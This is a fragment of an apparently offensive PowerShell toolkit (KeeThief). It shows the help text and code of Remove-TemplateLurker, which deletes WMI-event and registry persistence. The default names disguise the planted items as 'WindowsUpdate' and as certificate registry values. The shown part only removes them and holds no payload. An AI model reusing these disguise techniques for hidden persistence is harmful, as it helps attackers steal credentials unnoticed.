.PARAMETER RegistryPath

Indicates the a non-default registry path was specified.

.PARAMETER EventName

Specifies the name that was used for the WMI event. 

.EXAMPLE

PS C:\>Remove-TemplateLurker -EventName Lurker -WMI

This command will remove the WMI event and the custom WMI namespace/class.

.EXAMPLE

PS C:\>Remove-TemplateLurker -EventName Lurker -Registry

This command will remove ther WMI event and the storage in registry.

.EXAMPLE

PS C:\>Remove-TemplateLurker -EventName Lurker -WMI -NamespaceName root\cimv2\KeeThief -ExposeNamespace

This command will remove the WMI event and the custom WMI namespace/class. Read access to 'Everyone' will
be revoked.
#>

    Param (

        [Parameter(ParameterSetName = 'WMI')]
        [String]
        $ClassName = 'WindowsUpdate',

        [Parameter(Mandatory = $True, ParameterSetName = 'Registry')]
        [Parameter(Mandatory = $True, ParameterSetName = 'WMI')]
        [String]
        $EventName,

        [Parameter(ParameterSetName = 'WMI')]
        [Switch]
        $ExposeNamespace,

        [Parameter(ParameterSetName = 'WMI')]
        [String]
        $NamespaceName = 'ROOT\Software',

        [Parameter(ParameterSetName = 'Registry')]
        [String]
        $OutputValueName = 'ComputerCertificate',
        
        [Parameter(Mandatory = $True,ParameterSetName = 'Registry')]
        [Switch]
        $Registry,
        
        [Parameter(ParameterSetName = 'Registry')]
        [String]
        $RegistryPath = "HKLM:\SOFTWARE\Microsoft\SystemCertificates\$Name",

        [Parameter(ParameterSetName = 'Registry')]
        [String]
        $PayloadValueName = 'DomainCertificate',

        [Parameter(Mandatory = $True, ParameterSetName = 'WMI')]
        [Switch]
        $WMI
        
    )

    # Store payload
    switch($PsCmdlet.ParameterSetName){
        'WMI'{
            
            # Remove custom WMI class
            Get-WmiObject -class "Win32_$ClassName" -Namespace $NamespaceName | Remove-WmiObject
            Write-Verbose "Custom WMI Class Win32_$ClassName Deleted"

            # Remove custom WMI namespace
            $NSArray = $NamespaceName.Split('\')
            Get-WmiObject -class __NAMESPACE -Namespace $($NSArray[0..($NSArray.Length - 2)] -join '\') -Filter "name='$($NSArray[-1])'" | Remove-WmiObject
            Write-Verbose "Namespace $NamespaceName Deleted"

            # Revoke remote read access to custom namespace
            if($ExposeNamespace){
                Revoke-WmiNameSpaceRead -NameSpace $NamespaceName
            }

            # Remove WMI event
            Get-WMIEvent -Name $EventName | Remove-WmiObject
            Write-Verbose "WMI KeeTheifLurker '$EventName' Deleted."
        }
       'Registry'{

            $Key = Get-Item $RegistryPath 
            $Key | Remove-ItemProperty -Name $PayloadValueName 
            Write-Verbose "Registry Value $PayloadValueName at $RegistryPath deleted"
            $Key | Remove-ItemProperty -Name $OutputValueName
            Write-Verbose "Registry Value $OutputValueName at $RegistryPath deleted"

            Get-WMIEvent -Name $EventName @Arguments | Remove-WmiObject
            Write-Verbose "Registry KeeTheifLurker '$EventName' Deleted"
     
        }
    }

}